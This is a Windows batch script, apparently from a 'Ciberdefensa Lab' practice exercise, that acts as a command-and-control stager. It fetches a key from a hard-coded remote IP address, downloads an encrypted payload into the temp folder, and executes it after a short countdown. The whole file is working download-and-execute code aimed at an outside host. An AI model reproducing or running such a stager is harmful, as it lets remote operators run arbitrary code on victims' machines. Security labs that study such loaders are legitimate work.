@echo off
setlocal EnableDelayedExpansion
title C2 VirusPracticaAlex - 100% Stable
color 0A

echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║  🔥 C2 VIRUSPRÁCTICA - ESTABLE 100% 🔥                ║
echo ║  Alex Montilla - Ciberdefensa Lab                    ║
echo ╚══════════════════════════════════════════════════════╝
echo.

set "BASE=http://82.29.153.101:8080"
set "FILE=%TEMP%\sc.bat"

echo 🌐 TARGET: %BASE%
echo 📁 OUTPUT: %FILE%
echo.

REM ===== 1. TIMESTAMP (SÚPER SIMPLE) =====
echo 🔢 [1/4] TIMESTAMP...
powershell -Command "(Get-Date).ToUniversalTime().Subtract((Get-Date '1970-01-01')).TotalSeconds" > "%TEMP%\ts.tmp"
set /p TS= < "%TEMP%\ts.tmp"
del "%TEMP%\ts.tmp" 2>nul
echo    ✓ TS=%TS%
echo.

REM ===== 2. KEY (SIN REDIRECCIONES COMPLEJAS) =====
echo 🔑 [2/4] KEY...
set "REQ_URL=%BASE%/auth/key?ts=%TS%"
echo    URL: %REQ_URL%

REM MÉTODO ULTRA-SEGURO: curl directo a variable
for /f "tokens=*" %%i in ('curl -s --max-time 5 "%REQ_URL%"') do (
    set "KEY=%%i"
    goto :got_key
)
:got_key
if not defined KEY (
    echo    ❌ NO KEY RECEIVED
    echo    🔍 Test manual: curl -s "%REQ_URL%"
    pause
    exit /b 1
)

set KEY_LEN=0
for /l %%i in (0,1,50) do if "!KEY:~%%i,1!" neq "" set /a KEY_LEN=%%i+1

echo    ✓ KEY=%KEY:~0,20%... (%KEY_LEN% chars)
if %KEY_LEN% neq 44 (
    echo    ❌ KEY LEN != 44
    pause
    exit /b 1
)
echo.

REM ===== 3. PAYLOAD (URL EN VARIABLE) =====
echo 📥 [3/4] PAYLOAD...
set "PAYLOAD_URL=%BASE%/payload/encrypted"
curl -s --max-time 10 -H "X-Decrypt-Key: %KEY%" "%PAYLOAD_URL%" -o "%FILE%"

if errorlevel 1 (
    echo    ❌ DOWNLOAD FAILED
    pause
    exit /b 1
)

if not exist "%FILE%" (
    echo    ❌ FILE NOT CREATED
    dir "%TEMP%\sc*"
    pause
    exit /b 1
)

for %%F in ("%FILE%") do set FILESIZE=%%~zF
echo    ✓ %FILE% (%FILESIZE% bytes)
echo.

REM ===== 4. PREVIEW + EXEC =====
echo 👁️  [4/4] PREVIEW:
echo    ╔══════
type "%FILE%" | findstr /n "^" | more /e +1 /n 12
echo    ║
echo ⚡  EXECUTANDO en 3s... [Ctrl+C para abortar]
timeout /t 3 /nobreak >nul

echo    → call "%FILE%"
call "%FILE%"

echo.
echo ✅ MISSION COMPLETE ✓
echo 📁 Cleanup: %FILE% queda para debug
pause >nul